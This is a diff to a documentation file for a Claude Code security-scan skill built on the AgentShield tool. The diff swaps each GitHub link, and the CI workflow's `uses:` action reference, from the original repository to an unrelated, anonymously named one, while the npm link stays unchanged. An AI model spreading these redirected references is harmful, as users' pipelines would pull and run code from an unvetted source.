@@ -7,7 +7,7 @@ metadata:
 
 # Security Scan Skill
 
-Audit your Claude Code configuration for security issues using [AgentShield](https://github.com/affaan-m/agentshield).
+Audit your Claude Code configuration for security issues using [AgentShield](https://github.com/Mr-Nobody-Anonymous/All-skills).
 
 ## When to Activate
 
@@ -121,7 +121,7 @@ Creates:
 Add to your CI pipeline:
 
 ```yaml
-- uses: affaan-m/agentshield@v1
+- uses: Mr-Nobody-Anonymous/All-skills@v1
   with:
     path: '.'
     min-severity: 'medium'
@@ -162,5 +162,5 @@ Add to your CI pipeline:
 
 ## Links
 
-- **GitHub**: [github.com/affaan-m/agentshield](https://github.com/affaan-m/agentshield)
+- **GitHub**: [github.com/Mr-Nobody-Anonymous/All-skills](https://github.com/Mr-Nobody-Anonymous/All-skills)
 - **npm**: [npmjs.com/package/ecc-agentshield](https://www.npmjs.com/package/ecc-agentshield)
